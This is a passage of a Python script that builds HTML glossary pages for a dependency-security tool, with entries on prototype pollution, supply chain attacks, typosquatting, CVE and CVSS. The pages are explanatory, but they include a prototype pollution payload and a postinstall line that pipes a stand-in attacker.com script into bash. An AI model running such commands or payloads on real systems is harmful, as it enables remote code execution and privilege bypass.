#!/usr/bin/env python3
"""
PackageFix — Glossary Pages Generator
15 terms with DefinedTerm schema for AI citation
Human voice throughout — no jargon-as-drama
"""

import os, json

BASE_URL = "https://packagefix.dev"

TOKENS = """
:root {
  --bg:#0B0D14; --surface:#12151F; --surface2:#1A1D2E;
  --border:#252836; --purple:#6C63FF; --green:#22C55E;
  --orange:#F97316; --red:#EF4444; --yellow:#EAB308;
  --text:#E2E4F0; --muted:#6B7280;
}
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
body{background:var(--bg);color:var(--text);font-family:'JetBrains Mono',monospace;font-size:13px;line-height:1.6;min-height:100vh}
a{color:var(--purple);text-decoration:none}
a:hover{text-decoration:underline}
.site-header{border-bottom:1px solid var(--border);padding:14px 24px;display:flex;align-items:center;justify-content:space-between}
.logo{font-size:15px;font-weight:700;color:var(--text)}
.logo span{color:var(--purple)}
.nav-links{display:flex;gap:20px;font-size:12px}
.nav-links a{color:var(--muted)}
.nav-links a:hover{color:var(--text);text-decoration:none}
.container{max-width:860px;margin:0 auto;padding:48px 24px}
.breadcrumb{font-size:11px;color:var(--muted);margin-bottom:24px;display:flex;gap:6px;flex-wrap:wrap}
.breadcrumb a{color:var(--muted)}
.definition-box{background:var(--surface);border:1px solid var(--purple);border-left:4px solid var(--purple);border-radius:8px;padding:20px 24px;margin:0 0 32px}
.definition-box .def-label{font-size:10px;font-weight:700;color:var(--purple);text-transform:uppercase;letter-spacing:.1em;margin-bottom:8px}
.definition-box p{color:var(--text);font-size:13px;line-height:1.7;margin:0}
h1{font-size:clamp(18px,3vw,28px);font-weight:700;margin-bottom:16px;line-height:1.3}
h2{font-size:15px;font-weight:600;margin:36px 0 12px}
h3{font-size:13px;font-weight:600;margin:20px 0 8px}
p{color:var(--muted);margin-bottom:12px;font-size:12px;line-height:1.7}
.lead{color:var(--text);font-size:13px;margin-bottom:0;line-height:1.7}
pre{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:14px 16px;overflow-x:auto;font-size:11px;line-height:1.6;margin:12px 0;white-space:pre-wrap}
code{background:var(--surface);border:1px solid var(--border);border-radius:3px;padding:1px 5px;font-size:11px}
.example-box{background:rgba(239,68,68,.06);border:1px solid rgba(239,68,68,.2);border-radius:8px;padding:16px 20px;margin:20px 0}
.example-box .label{font-size:10px;font-weight:700;color:var(--red);text-transform:uppercase;letter-spacing:.1em;margin-bottom:8px}
.fix-box{background:rgba(34,197,94,.06);border:1px solid rgba(34,197,94,.2);border-left:3px solid var(--green);border-radius:8px;padding:16px 20px;margin:20px 0}
.fix-box .label{font-size:10px;font-weight:700;color:var(--green);text-transform:uppercase;letter-spacing:.1em;margin-bottom:8px}
.cta-box{background:var(--surface);border:1px solid var(--purple);border-radius:10px;padding:24px;margin:32px 0;text-align:center}
.cta-box p{color:var(--text);font-size:13px;margin-bottom:16px}
.cta-btn{display:inline-block;background:var(--purple);color:#fff;font-family:'JetBrains Mono',monospace;font-size:13px;font-weight:600;padding:12px 28px;border-radius:7px;text-decoration:none}
.cta-btn:hover{opacity:.9;text-decoration:none}
.badge{display:inline-block;font-size:10px;font-weight:700;padding:2px 8px;border-radius:4px;text-transform:uppercase;letter-spacing:.05em}
.badge-purple{background:rgba(108,99,255,.2);color:var(--purple);border:1px solid var(--purple)}
.badge-red{background:rgba(239,68,68,.2);color:var(--red);border:1px solid var(--red)}
.badge-orange{background:rgba(249,115,22,.2);color:var(--orange);border:1px solid var(--orange)}
.faq{margin:40px 0}
.faq-item{border-bottom:1px solid var(--border);padding:16px 0}
.faq-item:last-child{border-bottom:none}
.faq-q{font-size:12px;font-weight:600;color:var(--text);margin-bottom:8px}
.faq-a{font-size:12px;color:var(--muted);line-height:1.7}
.related-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:12px;margin-top:12px}
.related-card{background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:14px}
.related-card a{color:var(--text);font-size:12px;font-weight:500}
.related-card p{font-size:11px;color:var(--muted);margin:4px 0 0}
.glossary-index{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:10px;margin-top:16px}
.glossary-card{background:var(--surface);border:1px solid var(--border);border-radius:8px;padding:14px}
.glossary-card a{color:var(--text);font-size:12px;font-weight:500}
.glossary-card p{font-size:11px;color:var(--muted);margin:4px 0 0;line-height:1.5}
.site-footer{border-top:1px solid var(--border);padding:24px;text-align:center;font-size:11px;color:var(--muted);margin-top:60px}
.site-footer a{color:var(--muted)}
@media(max-width:640px){.nav-links{display:none}.related-grid{grid-template-columns:1fr}.glossary-index{grid-template-columns:1fr}}
"""

def shell(title, desc, canonical_path, breadcrumbs, body, schemas):
    canonical = BASE_URL + canonical_path
    schema_json = json.dumps({"@context": "https://schema.org", "@graph": schemas}, indent=2)
    crumb_html = " <span style='color:var(--border)'>/</span> ".join(
        f'<a href="{u}">{n}</a>' if u else f'<span style="color:var(--text)">{n}</span>'
        for n, u in breadcrumbs
    )
    return f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>{title}</title>
<meta name="description" content="{desc}">
<link rel="canonical" href="{canonical}">
<meta property="og:title" content="{title}">
<meta property="og:description" content="{desc}">
<meta property="og:url" content="{canonical}">
<meta property="og:type" content="website">
<meta name="twitter:card" content="summary">
<link rel="icon" type="image/svg+xml" href="/icon.svg">
<link rel="icon" type="image/png" sizes="512x512" href="/icon.png">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;600;700&display=swap" rel="stylesheet">
<script type="application/ld+json">{schema_json}</script>
<style>{TOKENS}</style>
</head>
<body>
<header class="site-header">
  <a href="https://packagefix.dev" class="logo">Package<span>Fix</span></a>
  <nav class="nav-links">
    <a href="https://packagefix.dev">Tool</a>
    <a href="https://packagefix.dev/glossary">Glossary</a>
    <a href="https://packagefix.dev/blog">Blog</a>
    <a href="https://packagefix.dev/cisa-kev">CISA KEV</a>
    <a href="https://github.com/metriclogic26/packagefix">GitHub</a>
  </nav>
</header>
<main class="container">
  <div class="breadcrumb">{crumb_html}</div>
  {body}
</main>
<footer class="site-footer">
  <p>PackageFix · <a href="https://packagefix.dev">packagefix.dev</a> · MIT Licensed · Open Source</p>
  <p style="margin-top:6px">Part of the MetricLogic network ·
  <a href="https://configclarity.dev">ConfigClarity</a> ·
  <a href="https://domainpreflight.dev">DomainPreflight</a></p>
  <p style="margin-top:6px">Vulnerability data: <a href="https://osv.dev">OSV Database</a> · <a href="https://www.cisa.gov/known-exploited-vulnerabilities-catalog">CISA KEV Catalog</a></p>
</footer>
</body>
</html>"""

def cta():
    return """<div class="cta-box">
  <p>Check your dependencies for CVEs, CISA KEV entries, and supply chain risks.</p>
  <a href="https://packagefix.dev" class="cta-btn">Open PackageFix →</a>
  <p style="margin-top:12px;font-size:11px;color:var(--muted)">Free · No signup · No CLI · Runs in your browser</p>
</div>"""

def faq_section(faqs):
    items = "".join(
        f'<div class="faq-item"><div class="faq-q">{q}</div><div class="faq-a">{a}</div></div>'
        for q, a in faqs
    )
    return f'<div class="faq"><h2>Common questions</h2>{items}</div>'

def related_section(pages):
    cards = "".join(
        f'<div class="related-card"><a href="{p["url"]}">{p["title"]}</a><p>{p["desc"]}</p></div>'
        for p in pages
    )
    return f'<div style="margin:40px 0"><h2>Related guides</h2><div class="related-grid">{cards}</div></div>'

def glossary_schemas(term, definition, slug, faqs):
    path = f"/glossary/{slug}"
    return [
        {
            "@type": "DefinedTerm",
            "name": term,
            "description": definition,
            "url": BASE_URL + path,
            "inDefinedTermSet": {
                "@type": "DefinedTermSet",
                "name": "PackageFix Dependency Security Glossary",
                "url": BASE_URL + "/glossary"
            }
        },
        {
            "@type": "BreadcrumbList",
            "itemListElement": [
                {"@type": "ListItem", "position": 1, "name": "PackageFix", "item": BASE_URL},
                {"@type": "ListItem", "position": 2, "name": "Glossary", "item": BASE_URL + "/glossary"},
                {"@type": "ListItem", "position": 3, "name": term, "item": BASE_URL + path}
            ]
        },
        {
            "@type": "FAQPage",
            "mainEntity": [
                {"@type": "Question", "name": q, "acceptedAnswer": {"@type": "Answer", "text": a}}
                for q, a in faqs
            ]
        }
    ]

all_paths = []

def write(slug, html):
    path = os.path.join("seo", slug, "index.html")
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, "w", encoding="utf-8") as f:
        f.write(html)
    all_paths.append("/" + slug)
    print(f"  ✓ /{slug}")

# ══════════════════════════════════════════════════════════════════════════════
# GLOSSARY TERMS
# ══════════════════════════════════════════════════════════════════════════════

TERMS = [

    {
        "slug": "prototype-pollution",
        "term": "Prototype Pollution",
        "one_line": "An attack where malicious input modifies the base template that JavaScript uses to create all objects.",
        "badge": "JavaScript · npm",
        "definition": "Prototype pollution is a JavaScript vulnerability where an attacker can modify Object.prototype — the base blueprint that every JavaScript object inherits from. Once polluted, the malicious properties show up in every object in the application, which can lead to unexpected behavior, authentication bypasses, or remote code execution.",
        "body": """
<h2>What actually happens</h2>
<p>In JavaScript, every object inherits from Object.prototype. Think of it as a base template — when you create any object, it automatically gets properties from this template. Prototype pollution lets an attacker write to that template through crafted input.</p>
<p>The attack usually comes through a function that merges or deep-copies objects — lodash's merge(), qs's query string parser, and similar utilities. If the function doesn't filter out keys like <code>__proto__</code> or <code>constructor.prototype</code>, an attacker can slip in a payload that modifies the global template.</p>

<h2>What a payload looks like</h2>
<div class="example-box">
  <div class="label">Attack payload in a query string</div>
  <pre>?__proto__[isAdmin]=true</pre>
</div>
<p>If your application parses this with a vulnerable version of qs or lodash, and later checks <code>user.isAdmin</code> somewhere, every user might suddenly be an admin — including unauthenticated requests.</p>

<h2>Which packages have had prototype pollution CVEs</h2>
<p>It's a recurring problem in JavaScript utility libraries. Packages that do deep object manipulation are the most common source:</p>
<ul style="padding-left:20px;margin:12px 0;color:var(--muted);font-size:12px;line-height:2">
  <li><strong>lodash</strong> — CVE-2020-8203, CVE-2021-23337 (fixed in 4.17.21)</li>
  <li><strong>qs</strong> — CVE-2022-24999 (fixed in 6.11.0)</li>
  <li><strong>minimist</strong> — CVE-2021-44906 (fixed in 1.2.6)</li>
  <li><strong>tough-cookie</strong> — CVE-2023-26136 (fixed in 4.1.3)</li>
</ul>

<h2>How to protect against it</h2>
<div class="fix-box">
  <div class="label">Prevention</div>
  <p style="margin:0">Keep utility libraries up to date — most prototype pollution CVEs are fixed within weeks of discovery. Use <code>Object.freeze(Object.prototype)</code> in security-sensitive contexts. Validate and sanitize any object keys that come from user input before merging.</p>
</div>""",
        "faqs": [
            ("Is prototype pollution the same as prototype hijacking?", "They describe the same class of vulnerability. Prototype pollution is the more common term in CVE descriptions and security tooling. Both refer to modifying Object.prototype via crafted input."),
            ("Can prototype pollution lead to remote code execution?", "Yes — in some cases. If the polluted prototype property ends up in a code path that calls eval(), executes shell commands, or deserializes data, prototype pollution can escalate to RCE. Most commonly it leads to authentication bypass or DoS."),
            ("Does TypeScript protect against prototype pollution?", "No. TypeScript is a compile-time tool. Prototype pollution happens at runtime — TypeScript types are erased by then. You still need to update affected packages and sanitize input."),
            ("How does PackageFix detect prototype pollution CVEs?", "PackageFix queries the OSV database for every package in your manifest and flags any version with a known prototype pollution CVE. Affected packages get a HIGH or CRITICAL badge with the specific CVE ID and safe version to upgrade to.")
        ],
        "related": [
            {"url": "/fix/npm/lodash", "title": "Fix Lodash CVE-2020-8203", "desc": "Prototype pollution fix"},
            {"url": "/fix/npm/qs", "title": "Fix qs CVE-2022-24999", "desc": "Query string pollution fix"},
            {"url": "/fix/npm/minimist", "title": "Fix minimist CVE-2021-44906", "desc": "Arg parser pollution fix"},
            {"url": "/glossary/supply-chain-attack", "title": "Supply Chain Attack", "desc": "How dependencies get compromised"},
        ]
    },

    {
        "slug": "supply-chain-attack",
        "term": "Supply Chain Attack",
        "one_line": "When an attacker compromises software you use rather than software you write.",
        "badge": "All ecosystems",
        "definition": "A supply chain attack targets the tools, libraries, and services your code depends on rather than your code itself. Instead of breaking into your application directly, attackers compromise a dependency you trust — then everyone who installs that dependency gets the malicious code automatically.",
        "body": """
<h2>Why it's hard to defend against</h2>
<p>When you write <code>npm install express</code>, you're trusting Express and every package Express depends on. A modern Node.js application might have 500-1000 transitive dependencies — packages you've never heard of, maintained by people you've never met. An attacker only needs to compromise one of them.</p>
<p>The attack is particularly effective because the malicious code arrives through your normal build process. It looks identical to a legitimate dependency update. By the time anyone notices, the code has been running in production for days or weeks.</p>

<h2>Common attack patterns</h2>
<h3>Compromised maintainer account</h3>
<p>An attacker gains access to a package maintainer's npm or PyPI account and publishes a malicious version. The package's download count and reputation stay intact — only the code changes. The event-stream incident (2018) and dozens of others since have used this pattern.</p>

<h3>Typosquatting</h3>
<p>Register a package with a name one typo away from a popular package. <code>expres</code> instead of <code>express</code>. Wait for developers to mistype and install the malicious version.</p>

<h3>Dependency confusion</h3>
<p>If your company uses private packages with certain names, an attacker can register those same names on the public registry. Some package managers will fetch the public version instead of the private one.</p>

<h3>Build script injection</h3>
<p>Add <code>curl https://attacker.com/payload.sh | bash</code> to a package's postinstall script. Runs automatically when anyone installs the package.</p>

<h2>Real examples that hit production</h2>
<ul style="padding-left:20px;margin:12px 0;color:var(--muted);font-size:12px;line-height:2">
  <li><strong>event-stream (2018)</strong> — malicious code targeting a Bitcoin wallet, reached millions of installs</li>
  <li><strong>ua-parser-js (2021)</strong> — compromised to install cryptomining malware</li>
  <li><strong>colors and faker (2022)</strong> — maintainer deliberately broke packages affecting thousands of projects</li>
  <li><strong>Contagious Interview (2024-2026)</strong> — North Korean operation using fake npm packages to target developers</li>
</ul>""",
        "faqs": [
            ("How is a supply chain attack different from a regular vulnerability?", "A regular vulnerability is a bug in code — it exists but hasn't been exploited yet. A supply chain attack is an active, intentional attack — someone deliberately puts malicious code into a package that developers trust and install."),
            ("Does npm audit catch supply chain attacks?", "No. npm audit only checks for known CVEs in the vulnerability database. It doesn't detect malicious code added to a package, compromised maintainer accounts, or typosquatting. Those require behavioral analysis and supply chain-specific detection."),
            ("What does PackageFix check for supply chain attacks?", "PackageFix checks for: Unicode/invisible characters in scripts (Glassworm), packages dormant for 12+ months that suddenly updated (zombie packages), package names one character from popular packages (typosquatting), curl/wget in postinstall scripts (build script injection), and packages flagged on the CISA KEV catalog."),
            ("Can I completely prevent supply chain attacks?", "No — but you can significantly reduce your exposure. Keep dependencies updated, use lockfiles, pin specific versions in CI, and scan manifests regularly with tools like PackageFix.")
        ],
        "related": [
            {"url": "/blog/supply-chain-attacks-package-json", "title": "5 Supply Chain Attacks npm Misses", "desc": "Attack patterns with detection methods"},
            {"url": "/glossary/dependency-confusion", "title": "Dependency Confusion", "desc": "Private package name attack"},
            {"url": "/glossary/typosquatting", "title": "Typosquatting", "desc": "One character off"},
            {"url": "/cisa-kev", "title": "CISA KEV Packages", "desc": "Actively exploited right now"},
        ]
    },

    {
        "slug": "dependency-confusion",
        "term": "Dependency Confusion",
        "one_line": "When a package manager fetches the wrong version of a package because an attacker registered the same name on a public registry.",
        "badge": "npm · PyPI · all registries",
        "definition": "Dependency confusion (also called namespace confusion) is a supply chain attack where an attacker registers a package on a public registry with the same name as a private internal package your company uses. Some package managers, by default, will fetch the public version instead of the private one — silently installing the attacker's code.",
        "body": """
<h2>How it works in practice</h2>
<p>Say your company has an internal npm package called <code>acme-auth</code> hosted on a private registry. An attacker registers <code>acme-auth</code> on the public npm registry with a higher version number (e.g., 99.0.0). When a developer runs <code>npm install</code>, the package manager sees the public version is newer and fetches it instead of the private one.</p>
<p>Security researcher Alex Birsan demonstrated this attack in 2021 against Apple, Microsoft, Tesla, Uber, and 30 other companies — all without any malicious intent, just to prove the attack worked. He reported the vulnerabilities and received over $130,000 in bug bounties.</p>

<h2>Which package managers are affected</h2>
<ul style="padding-left:20px;margin:12px 0;color:var(--muted);font-size:12px;line-height:2">
  <li><strong>npm</strong> — default behavior prefers public registry unless explicitly configured</li>
  <li><strong>pip</strong> — same issue with PyPI vs private indexes</li>
  <li><strong>gem</strong> — RubyGems vs private Gemfury or Nexus</li>
  <li><strong>composer</strong> — Packagist vs private repositories</li>
</ul>

<h2>How to prevent it</h2>
<div class="fix-box">
  <div class="label">Prevention</div>
  <p style="margin:0">Scope all internal npm packages under your organization (<code>@acme/auth</code> instead of <code>acme-auth</code>) — scoped packages can't be squatted on public npm without your org's verification. For pip, use <code>--index-url</code> to specify your private index and <code>--no-index</code> to prevent fallback to PyPI.</p>
</div>""",
        "faqs": [
            ("Is dependency confusion the same as typosquatting?", "No — they're related but different. Typosquatting uses a similar-sounding name to catch typos. Dependency confusion uses the exact same name as a private internal package, exploiting how package managers resolve naming conflicts between public and private registries."),
            ("How do I know if my internal packages are at risk?", "Check if any of your internal package names exist on the public registry (npm, PyPI, etc.). If an attacker has already registered them with a high version number, you're at risk. Scope all internal packages under a verified org namespace as the permanent fix."),
            ("Did dependency confusion affect real companies?", "Yes — Alex Birsan's 2021 research demonstrated it against Apple, Microsoft, Tesla, PayPal, Shopify, Netflix, Yelp, and others. All were fixed after responsible disclosure.")
        ],
        "related": [
            {"url": "/glossary/supply-chain-attack", "title": "Supply Chain Attack", "desc": "The broader attack category"},
            {"url": "/glossary/typosquatting", "title": "Typosquatting", "desc": "Similar name attacks"},
            {"url": "/blog/supply-chain-attacks-package-json", "title": "Supply Chain Attack Guide", "desc": "5 attacks npm audit misses"},
            {"url": "/npm", "title": "npm Security Guide", "desc": "All npm vulnerability guides"},
        ]
    },

    {
        "slug": "typosquatting",
        "term": "Typosquatting",
        "one_line": "Registering a package name one character off from a popular one, waiting for developers to mistype it.",
        "badge": "npm · PyPI · all registries",
        "definition": "Typosquatting in the context of software packages means registering a package name that looks almost identical to a legitimate, popular package — one letter swapped, a missing character, or a common misspelling. When a developer mistype the package name in npm install or pip install, they get the malicious package instead.",
        "body": """
<h2>Why it keeps working</h2>
<p>The npm and PyPI registries are open — anyone can register any available name. There's no automatic protection against names that are suspiciously close to popular packages. By the time security researchers notice and report a typosquatted package, it may have already been installed thousands of times.</p>
<p>The attack is simple and low-effort for attackers. Register <code>expres</code> (missing the final s), add a postinstall script that exfiltrates environment variables to a remote server, and wait. Developers mistype package names all the time.</p>

<h2>Common targets</h2>
<pre>express    → expres, expresss, expresjs
lodash     → lodas, lodashs, lodahs
react      → reacts, reaact, recat
axios      → axois, axois, axxios
webpack    → webpak, webapck, webpackk
requests   → requets, reqeusts (Python)
django     → dajngo, djagno (Python)</pre>

<h2>Real typosquatting incidents</h2>
<p>In 2022, researchers found over 200 typosquatted packages on PyPI targeting popular data science libraries. In 2023, a campaign targeted npm packages used in crypto development. In early 2026, the Contagious Interview operation used typosquatted packages as part of a broader developer targeting campaign.</p>

<h2>How PackageFix detects it</h2>
<p>PackageFix runs a Levenshtein distance check on every package name in your manifest against a hardcoded list of the top 100 packages per ecosystem. A distance of 1 (one character different) triggers a <span class="badge badge-orange">TYPOSQUAT?</span> badge: "Similar to express — verify this is the correct package."</p>""",
        "faqs": [
            ("How is typosquatting different from dependency confusion?", "Typosquatting uses a similar-looking name to catch developers who mistype. Dependency confusion uses the exact same name as a private internal package to exploit how registries are prioritized. Both result in the wrong package being installed."),
            ("Can npm or PyPI prevent typosquatting?", "Both registries have manual review processes and respond to reports, but they can't automatically prevent all typosquatted names from being registered. Prevention is faster than removal — check package names carefully before installing."),
            ("What should I do if I accidentally installed a typosquatted package?", "Remove it immediately. Rotate any secrets, tokens, or credentials that were available as environment variables during the install — the postinstall script may have already exfiltrated them. Check your .env files and CI secrets."),
            ("Does PackageFix check for typosquatting in my lockfile?", "Yes — PackageFix checks all package names in your manifest against the top 100 packages in each ecosystem using Levenshtein distance. Drop your package-lock.json alongside your package.json for transitive dependency checking too.")
        ],
        "related": [
            {"url": "/glossary/supply-chain-attack", "title": "Supply Chain Attack", "desc": "The broader attack category"},
            {"url": "/glossary/dependency-confusion", "title": "Dependency Confusion", "desc": "Same name, different attack"},
            {"url": "/blog/supply-chain-attacks-package-json", "title": "5 Supply Chain Attacks", "desc": "npm audit misses these"},
            {"url": "/npm", "title": "npm Security Guide", "desc": "All npm vulnerability guides"},
        ]
    },

    {
        "slug": "transitive-dependency",
        "term": "Transitive Dependency",
        "one_line": "A package your code doesn't use directly but gets pulled in because something you do use depends on it.",
        "badge": "All ecosystems",
        "definition": "A transitive dependency is a package you didn't explicitly install but ended up in your project because a package you did install needs it. If your app uses Express, and Express uses a package called qs, then qs is a transitive dependency of your app — even though you never wrote it in your package.json.",
        "body": """
<h2>Why transitive dependencies matter for security</h2>
<p>Most developers know their direct dependencies — the 20 or 30 packages they've actually added to their project. But a typical Node.js application has 500 to 1000 packages in node_modules once all the transitive dependencies are resolved. Most of those are packages you've never heard of, and you're trusting all of them.</p>
<p>When npm audit reports a vulnerability, it's often in a transitive dependency. The CVE is in a package three layers deep that you didn't install and don't use directly. The fix isn't as simple as bumping a version number in your package.json — you need to either update the direct dependency that brings it in, or use an overrides block to force the safe version.</p>

<h2>An example</h2>
<pre>Your app
  └── express 4.17.1 (direct)
        └── qs 6.5.2 (transitive — vulnerable to CVE-2022-24999)
        └── body-parser (transitive)
              └── qs 6.5.2 (transitive, again)</pre>
<p>You didn't install qs. You don't use qs directly. But it's in your app twice, both vulnerable. To fix it, you either update express (which ships with a newer qs), or you add an npm overrides block to force a safe version.</p>

<h2>How to fix a transitive dependency vulnerability</h2>
<div class="fix-box">
  <div class="label">npm overrides</div>
  <pre>{
  "overrides": {
    "qs": "6.11.0"
  }
}</pre>
</div>
<p>PackageFix generates this overrides block automatically when it detects a transitive vulnerability. You don't need to know which package brings it in — just copy the generated override and run npm install.</p>""",
        "faqs": [
            ("How many transitive dependencies does a typical project have?", "A typical Node.js project has 5-30 direct dependencies and anywhere from 100 to 1000+ transitive dependencies. React apps tend to have more because of the build toolchain. A create-react-app project has over 1,800 packages in node_modules."),
            ("What's a lockfile's role in transitive dependencies?", "The lockfile (package-lock.json, poetry.lock, Gemfile.lock) records the exact resolved versions of every direct and transitive dependency. Without a lockfile, running npm install on different machines or at different times can produce different transitive dependency versions — which means different vulnerability exposure."),
            ("Does PackageFix scan transitive dependencies?", "Yes — drop your lockfile (package-lock.json for npm, poetry.lock for Python) alongside your manifest into PackageFix. It parses the lockfile to check every resolved transitive dependency, not just the ones in your package.json."),
            ("Can I tell npm to ignore a transitive dependency vulnerability?", "You can add it to npm's audit ignore list, but this just hides the vulnerability — it doesn't fix it. Use overrides to actually force a safe version.")
        ],
        "related": [
            {"url": "/glossary/dependency-scanning", "title": "Dependency Scanning", "desc": "How to find vulnerable deps"},
            {"url": "/fix/npm/transitive-vulnerability", "title": "Fix Transitive Vulnerabilities", "desc": "npm overrides guide"},
            {"url": "/guides/github-actions", "title": "GitHub Actions Scanning", "desc": "Automate in CI"},
            {"url": "/npm", "title": "npm Security Guide", "desc": "All npm vulnerability guides"},
        ]
    },

    {
        "slug": "cve",
        "term": "CVE — Common Vulnerabilities and Exposures",
        "one_line": "A standardized ID number assigned to a publicly known security vulnerability.",
        "badge": "Industry standard",
        "definition": "A CVE (Common Vulnerabilities and Exposures) is a unique identifier assigned to a publicly known security vulnerability. When a security researcher discovers a vulnerability in a piece of software, they can request a CVE ID from MITRE. The ID (like CVE-2021-44228 for Log4Shell) becomes the universal reference for that vulnerability across all security tools, databases, and documentation.",
        "body": """
<h2>What a CVE ID tells you</h2>
<p>A CVE ID has a simple structure: <code>CVE-[year]-[number]</code>. The year is when the CVE was assigned (not necessarily when the vulnerability was discovered or fixed). The number is a sequential ID within that year.</p>
<p>CVE-2021-44228 is Log4Shell — discovered and assigned a CVE in December 2021. CVE-2022-22965 is Spring4Shell — 2022. The year in the ID is a rough indicator of when the vulnerability became publicly known.</p>

<h2>CVE vs NVD vs OSV — what's the difference</h2>
<p>These are related but separate things that confuse a lot of people:</p>
<ul style="padding-left:20px;margin:12px 0;color:var(--muted);font-size:12px;line-height:2">
  <li><strong>CVE</strong> — just the ID number. Assigned by MITRE. No scoring, no detail beyond a brief description.</li>
  <li><strong>NVD (National Vulnerability Database)</strong> — the US government database that enriches CVEs with CVSS scores, affected versions, and references. Often lags behind CVE assignment by days to weeks.</li>
  <li><strong>OSV (Open Source Vulnerabilities)</strong> — Google's database focused on open source packages. Much faster than NVD, maps vulnerabilities directly to package versions. What PackageFix uses.</li>
  <li><strong>GHSA (GitHub Security Advisory)</strong> — GitHub's advisory database, often the first place a CVE gets detailed package-version information.</li>
</ul>

<h2>Why some vulnerabilities don't have CVE IDs</h2>
<p>Getting a CVE assigned takes time — sometimes weeks or months after a fix is released. Aikido's research found that 67% of open source vulnerability patches were released without ever receiving a CVE. This is a real blind spot: npm audit only checks CVE databases, so it misses the majority of patched vulnerabilities that were never formally disclosed.</p>""",
        "faqs": [
            ("Who assigns CVE IDs?", "MITRE Corporation manages the CVE program under contract with CISA. Large organizations (like Microsoft, Google, Red Hat) are authorized CVE Numbering Authorities (CNAs) and can assign CVEs for vulnerabilities in their own products. For open source packages without a CNA, researchers submit to MITRE directly."),
            ("What's the difference between a CVE and a CVSS score?", "A CVE is the identifier — the name. CVSS (Common Vulnerability Scoring System) is the severity score assigned to that CVE, from 0.0 to 10.0. Critical = 9.0-10.0, High = 7.0-8.9, Medium = 4.0-6.9, Low = 0.1-3.9. The CVE and its CVSS score are separate pieces of information."),
            ("Does PackageFix use CVE IDs?", "Yes — every vulnerability PackageFix detects is linked to its CVE ID (when one exists) via osv.dev. For vulnerabilities without a CVE, PackageFix shows the OSV ID (GHSA-XXXX format from GitHub Advisory Database)."),
            ("What is a zero-day CVE?", "A zero-day vulnerability is one being exploited in the wild before it has a public fix or even a CVE assignment. The Log4Shell vulnerability was being actively exploited for days before the CVE was assigned and a patch released.")
        ],
        "related": [
            {"url": "/glossary/cvss", "title": "CVSS Score", "desc": "How vulnerabilities are rated"},
            {"url": "/glossary/cisa-kev", "title": "CISA KEV", "desc": "CVEs being actively exploited"},
            {"url": "/cisa-kev", "title": "CISA KEV Package List", "desc": "Exploited open source packages"},
            {"url": "/kev/CVE-2021-44228", "title": "CVE-2021-44228 (Log4Shell)", "desc": "Most severe Java CVE ever"},
        ]
    },

    {
        "slug": "cvss",
        "term": "CVSS — Common Vulnerability Scoring System",
        "one_line": "A 0-10 score that describes how severe a security vulnerability is.",
        "badge": "Industry standard",
        "definition": "CVSS (Common Vulnerability Scoring System) is a numerical score from 0.0 to 10.0 that describes the severity of a security vulnerability. A score of 10.0 is the worst possible. The score is calculated from factors like how easily the vulnerability can be exploited, whether the attacker needs authentication, and what the potential impact is.",
        "body": """
<h2>What the scores mean</h2>
<ul style="padding-left:20px;margin:12px 0;color:var(--muted);font-size:12px;line-height:2">
  <li><strong>Critical (9.0–10.0)</strong> — can be exploited remotely, no authentication, high impact. Log4Shell is 10.0. These need immediate attention.</li>
  <li><strong>High (7.0–8.9)</strong> — serious but with some mitigating factor — maybe requires authentication, or only affects some configurations. Still urgent.</li>
  <li><strong>Medium (4.0–6.9)</strong> — real risk but limited scope. Usually requires specific conditions. Fix on your normal patch cycle.</li>
  <li><strong>Low (0.1–3.9)</strong> — minimal risk. Theoretical or requires significant user interaction. Fix when convenient.</li>
</ul>

<h2>What goes into a CVSS score</h2>
<p>The score is calculated from three metric groups:</p>
<ul style="padding-left:20px;margin:12px 0;color:var(--muted);font-size:12px;line-height:2">
  <li><strong>Base metrics</strong> — intrinsic properties of the vulnerability: attack vector (network vs local), complexity, privileges required, user interaction required, and impact on confidentiality/integrity/availability</li>
  <li><strong>Temporal metrics</strong> — how the score changes over time as patches become available</li>
  <li><strong>Environmental metrics</strong> — how the score applies to your specific environment</li>
</ul>
<p>Most tools only show the Base score. A CVSS 9.8 means: network-accessible, low complexity, no privileges needed, no user interaction, critical impact. That's about as bad as it gets.</p>

<h2>The problem with only looking at CVSS</h2>
<p>Not all High severity CVEs are equal in practice. A High CVE in a package you use in a code path that handles untrusted network input is far more dangerous than a High CVE in a package you only use in a build script. CVSS describes the vulnerability in isolation — it doesn't know your specific usage.</p>
<p>CISA KEV is a better signal for prioritization: it only lists vulnerabilities that are being actively exploited in the real world, regardless of CVSS score.</p>""",
        "faqs": [
            ("Should I fix all High and Critical CVEs immediately?", "All Critical CVEs should be fixed as fast as possible. For High CVEs, prioritize those on the CISA KEV catalog (actively exploited) first, then the rest on your normal patch schedule. Medium and Low CVEs can usually wait for the next scheduled update."),
            ("Can a Low CVSS score still be dangerous?", "Yes — in the right context. A Low or Medium CVE in a package that handles authentication, cryptography, or sensitive data can be more dangerous than a High CVE in a logging utility. CVSS is a starting point, not the whole story."),
            ("What CVSS score does PackageFix show?", "PackageFix shows severity badges (CRITICAL, HIGH, MEDIUM) derived from CVSS scores. Packages on the CISA KEV catalog get an additional 🔴 KEV flag regardless of their CVSS score, since active exploitation is more urgent than theoretical severity."),
            ("Why do different tools show different CVSS scores for the same CVE?", "CVSS scores can differ between NVD, GitHub Advisory Database, and vendor advisories. Each may calculate slightly different base scores. Tools that use different data sources may show different numbers. The general severity tier (Critical/High/Medium) is usually consistent even when exact scores differ.")
        ],
        "related": [
            {"url": "/glossary/cve", "title": "CVE", "desc": "The vulnerability ID system"},
            {"url": "/glossary/cisa-kev", "title": "CISA KEV", "desc": "Actively exploited CVEs"},
            {"url": "/cisa-kev", "title": "CISA KEV Package List", "desc": "Exploited open source packages"},
            {"url": "/glossary/dependency-scanning", "title": "Dependency Scanning", "desc": "How to find CVEs in your deps"},
        ]
    },

    {
        "slug": "cisa-kev",
        "term": "CISA KEV — Known Exploited Vulnerabilities",
